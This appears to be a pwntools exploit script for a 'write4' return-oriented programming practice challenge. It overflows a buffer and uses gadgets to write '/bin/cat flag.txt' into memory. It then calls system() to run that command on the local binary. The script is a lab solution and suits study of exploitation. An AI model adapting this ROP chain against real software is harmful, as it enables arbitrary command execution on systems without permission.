#!/usr/bin/env python

import sys
import pwn
import time
import struct

import util

load = 0x00400890
store = 0x00400820

def pack(a):
    return struct.pack("<Q", a)

def chain(a):
    return ''.join(map(pack, a))

def write_string(loc, st):
    chain = ''
    for i in xrange(0, len(st), 8):
        data = st[i:i+8]
        data += '\0' * (8-len(data))
        chain += pack(load)
        chain += pack(loc + i)
        chain += data
        chain += pack(store)
    return chain

def main():
    data_section = 0x00601050
    pop_rdi = 0x00400893
    system = 0x00400810

    ch = 'a' * 40
    ch += write_string(data_section, '/bin/cat flag.txt')
    ch += chain([pop_rdi, data_section, system])

    with open('write4.in', 'wb') as f:
        f.write("{}\n".format(ch))

    print ch
    proc = pwn.process('./write4')
    proc.sendline(ch)
    print proc.recvall()

if __name__ == '__main__':
    main()
